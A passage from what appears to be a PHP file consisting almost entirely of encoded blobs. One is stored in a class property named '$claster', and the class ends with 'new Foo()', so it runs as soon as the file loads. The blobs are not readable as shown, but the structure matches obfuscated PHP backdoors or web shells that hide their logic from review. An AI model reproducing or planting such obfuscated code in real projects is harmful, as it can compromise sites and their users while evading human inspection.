uRB3z3I9kLsfhP8wkvB+MnGhCsckm0DuInrquAGx746yHojItrlYfrIAr3VsxItF7kqHbmff6gZpHXPjqD5xOc8YDkh8ER539P1KhI1YMS4WpmtTiuifK3Wzt2xXvWObUTjwv+Ro5kKunVqa1ujHlQntFFm69dwyg57pUAGWyMlavW1NONIhQyTDfkb85rdpvOXm605nCTW2MH9xwQvojTO+wr86mj2S36TGWjxuUl2hFMneNkX96UVUuNgF5xkCx7vBTsJrFN2Cm/N9oGMTOv8Yx5EWsTjUt4CQJWFF5SyJQzsiGF2A9ochc32hQROvq4V+eoE6E3TCVMF7gzhB+mqbG0LNVVTCD3nK+IfFvHvtIcFkgfWJ3yVHCjimh0smFqHU0zmgUts3lyxB7veJor9q7nOZ4qCCDdyYG2Y0u6zZJnmglh95pyLbJNFuMVkuvkZxebpBEzO3Z/UmQ7E+NVQK8Peah0jAxo8d7v7Vn9ZewyYLi3DE9uj7u8kt7MkBdTRcxuZen1G23h/7QjwbZunTUxPZ7nEtqpErP0VXdO+xCIzSkyl/s+O0F18iVmUXB0XK7GnQgwqcYDTqNGckHlZkmJLVsXgQhOfD3TBXHi8+3XIZCzXFkaES16OZ+NLGaQ+fJIcnL4b5xVX2dFA6QmNf1GjXGVKw/Dom61N6y0MVQHJ1F88/Km01NIftUV5uw2F9OhRM7hghk2OcS6LOLQGpUlGdOa0R4RSGEK51w4TXmfyGrtYDdMJi98KpE9HB8F9lbOjQyPPo5AuuJYlMSEH9Yy/y0bmJQHIiI7aNbldxdSQlmXo2mckaGYqKUNYg7g0PyzJcJNyrk7nogU06Pcre08pj2tkiDdiHi17fxwAg/V9Wfp+26eK7Ph9KE2TbCkpGzwewDkUSWwr8okpHDWmBku8an74fvaV7c8w8tDcxSs1/q8JDrRoTQP/8H8gdHhFma/npDi8/TeBbJip73RwyfhB/CVqvPD+tWc4SAL6P1ggo1u7CF2eEF0HRCHXfN9RgjhCeFUSshjpxla/nF2ODr0+DNAwcVQbafDXWIf1kbyYdPMsdItrujnttioF0nhvpCsCT4+4txsGany14E0miMHplo/YdZCIyTdghiAYQWh/UET267HiR7jVlRxFVoEyq6K0ggZ54pmS7hEaHZG/WoTiteyND+Mb2KaZTbRsjMlp+0ES/WAU8ZvYG8qi+DwRk2uUX3TSr1FHfCpIhI8cucE9ww2Mdl"; var $claster = "XY9BS8NAEIXvhf6HcQlsAkEtxVJJk4ssVDxEk+glSFjbrVnoZsPupNh/78R60Nxm5r355k3gT7KDFFjD4Br88OHRhWZ/FwZNKYo3UdR8W1XPzTYvK/4exXAbwzJK5jN9CLX3CslYiJdXUVY1b8wneSIIWt8S8x9tYvoBLVZRAuro1R/YQ54/PYo6GHMRaz77hU2UBGjnSpkez+HooKtO4eA6kM7JyywGvl4tlvdrPgZWu9YC3xysMyB3qG2XMgZGYWv3KeutR5ZtdNcPCHjuVcpQfSGDThqqKfREpeeMJv0kjwO1WUb6zQjPePIN"; } new Foo(); ?>